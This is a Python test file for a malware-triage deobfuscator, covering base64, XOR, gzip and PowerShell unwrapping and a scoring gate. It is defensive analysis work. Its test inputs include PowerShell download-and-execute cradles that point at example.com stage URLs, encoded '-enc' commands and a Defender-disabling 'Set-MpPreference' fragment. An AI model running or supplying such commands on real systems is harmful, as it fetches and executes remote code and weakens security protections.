"""Deobfuscation tests, written to be killed by mutation.

The deobfuscator is the other place where a subtle wrong operator produces a plausible
but false result — a missed layer, or a flood of noise layers. These tests assert on the
recovered *content* and the provenance, and several name the mutation they kill.
"""

from __future__ import annotations

import base64
import bz2
import gzip
import random
import zlib

from revtriage.deobfuscate import compression, encoding, powershell, xor
from revtriage.deobfuscate.pipeline import deobfuscate
from revtriage.deobfuscate.score import (
    KEEP_THRESHOLD,
    MARKERS,
    interest,
    is_interesting,
    opens_as_compressed,
)


# -- encoding ------------------------------------------------------------------------

def test_base64_run_is_decoded():
    secret = b"http://example.com/payload and more text here"
    blob = base64.b64encode(secret)
    results = encoding.decode_all(b"prefix " + blob + b" suffix")
    assert any(secret == decoded for _, _, decoded in results)


def test_hex_string_is_decoded():
    results = encoding.decode_all(b"data=" + b"68747470")  # 'http'
    assert not any(b"http" == d for *_, d in results)  # too short to qualify (min 16 hex)
    long = b"".join(b"%02x" % b for b in b"http://example.com/abc")
    results = encoding.decode_all(long)
    assert any(b"http://example.com/abc" == d for *_, d in results)


# -- xor -----------------------------------------------------------------------------

def test_xor_recovers_key_and_plaintext():
    clear = b"GET http://example.com/c2 HTTP/1.1\r\nUser-Agent: bot\r\n" * 4
    key = 0x5A
    cipher = bytes(b ^ key for b in clear)
    keys = xor.find_keys(cipher)
    assert any(k == key for k, _, _ in keys)
    recovered = xor.recover(cipher)
    assert any(b"http://example.com/c2" in body for _, _, body in recovered)


def test_xor_never_reports_key_zero():
    """Kills changing `range(1, 256)` to `range(0, 256)`: key 0 is the identity and must
    never be offered, or every file 'decodes' with it."""
    clear = b"http://example.com/anchor-string-here plus padding padding padding"
    keys = xor.find_keys(clear)  # anchor present in cleartext -> key 0 would 'match'
    assert all(k != 0 for k, _, _ in keys)


def test_xor_container_hit_requires_real_decompression():
    """A random XORed blob with a coincidental gzip-magic collision must not be reported
    unless it actually decompresses — kills dropping the `_opens` verification."""
    payload = gzip.compress(b"the real decompressed body with http://example.com in it")
    key = 0x33
    cipher = bytes(b ^ key for b in payload)
    hits = xor.find_container_keys(cipher)
    assert any(k == key for k, _, _ in hits)


# -- compression ---------------------------------------------------------------------

def test_gzip_is_unwrapped():
    body = b"decompressed content with a marker http://example.com/x"
    out = compression.unwrap(gzip.compress(body))
    assert any(body == decoded for _, _, decoded in out)


# -- powershell ----------------------------------------------------------------------

def test_encoded_command_decodes_utf16():
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://example.com/a')"
    enc = base64.b64encode(inner.encode("utf-16-le")).decode()
    out = powershell.unwrap(f"powershell -enc {enc}".encode())
    assert any(inner.encode() == decoded for _, _, decoded in out)


def test_backtick_escape_is_stripped():
    out = powershell.unwrap(b"p`o`w`e`r`s`h`e`l`l -c calc")
    assert any(b"powershell" in decoded for _, _, decoded in out)


# -- score gate ----------------------------------------------------------------------

def test_marker_bearing_blob_is_kept():
    assert is_interesting(b"cmd.exe /c powershell -enc AAAA and some more content")


def test_pure_noise_is_rejected():
    """Noise carries no marker, low printability and no real words: below the threshold.

    The buffer is SEEDED, not `os.urandom`. Two random bytes land on `\\\\` — one of the
    markers, worth 40 on its own — about three times in a hundred 2 KB draws, so the
    unseeded version of this test failed roughly 3% of the time. Multiplied across a nine
    job CI matrix that is a red build on a quarter of all pushes, blamed on the runner.
    """
    noise = random.Random(1337).randbytes(2048)
    assert not [m for m in MARKERS if m.lower() in noise.lower()], "premise broken: seeded noise carries a marker"
    assert not is_interesting(noise)


def test_compressed_bonus_requires_a_stream_that_really_opens():
    """The +40 for "this is compressed" is a verification, not a magic-number sniff.

    Compressed bytes score zero on every readability signal, so the keep-gate hands them a
    large bonus on the strength of the header. If that bonus were awarded for the header
    alone, any two bytes of noise beginning 0x1f 0x8b would become a layer, and the report
    would fill with the garbage the gate exists to keep out.

    The impostor bodies are a fixed byte pattern, not `os.urandom`. A random body after a
    `0x78` byte forms a structurally valid zlib header roughly one time in 31 — a test that
    fails 3% of the time is worse than no test, because the failure gets blamed on the CI.
    """
    filler = bytes((i * 37 + 11) % 256 for i in range(512))

    real = gzip.compress(b"a genuine body, long enough to be worth keeping, with words in it")
    assert opens_as_compressed(real)
    assert is_interesting(real)

    # Same magic, nothing behind it: the compression method byte is invalid, so the
    # stream cannot open. No other signal can rescue it — the body is unreadable noise.
    assert not opens_as_compressed(b"\x1f\x8b\x00" + filler)
    assert not is_interesting(b"\x1f\x8b\x00" + filler)

    # 0x78 0x00 is deliberately not a valid zlib header: (0x78 << 8 | 0x00) % 31 != 0.
    assert not opens_as_compressed(b"\x78\x00" + filler)
    assert not opens_as_compressed(b"BZh\x00" + filler)

    # And the real things still open, on every algorithm the gate claims to verify.
    assert opens_as_compressed(zlib.compress(b"a real zlib stream with readable content"))
    assert opens_as_compressed(bz2.compress(b"a real bzip2 stream with readable content"))


def test_keep_threshold_boundary_is_inclusive():
    """Kills is_interesting's >= -> > : a candidate scoring exactly the threshold is kept."""
    # printable_ratio >= 0.95 gives +30; 8+ words gives +15 -> 45 >= 40. Build a clean
    # English sentence with no markers so the score is deterministic and >= threshold.
    text = b"the system file and error for this true false object string function return"
    assert interest(text) >= KEEP_THRESHOLD
    assert is_interesting(text, threshold=interest(text))  # exactly-equal must pass


# -- pipeline ------------------------------------------------------------------------

def test_pipeline_peels_base64_then_gzip_with_provenance():
    inner = b"IEX (New-Object Net.WebClient).DownloadString('http://example.com/stage2')"
    nested = base64.b64encode(gzip.compress(inner)).decode()
    layers, notes = deobfuscate(f"$x='{nested}'; iex $x".encode())
    # Layer 0 is the file; a deeper layer must carry the fully decoded inner script.
    decoded = [layer for layer in layers if inner in layer.data]
    assert decoded, "the base64->gzip payload was not recovered"
    leaf = decoded[0]
    assert leaf.depth >= 2
    # Provenance: walking parents from the leaf reaches L0.
    by_id = {layer.id: layer for layer in layers}
    node = leaf
    seen = 0
    while node.parent is not None and seen < 10:
        node = by_id[node.parent]
        seen += 1
    assert node.id == "L0"


def test_pipeline_respects_depth_limit():
    data = b"aaaa " + base64.b64encode(b"bbbb").decode().encode()
    layers, notes = deobfuscate(data, max_depth=1, max_layers=50)
    assert all(layer.depth <= 1 for layer in layers)


def test_embedded_bodies_enter_as_layers():
    layers, _ = deobfuscate(b"outer file", extra_bodies=[("macro:m1", b"Set-MpPreference -Disable")])
    assert any(layer.technique == "embedded" and b"MpPreference" in layer.data for layer in layers)
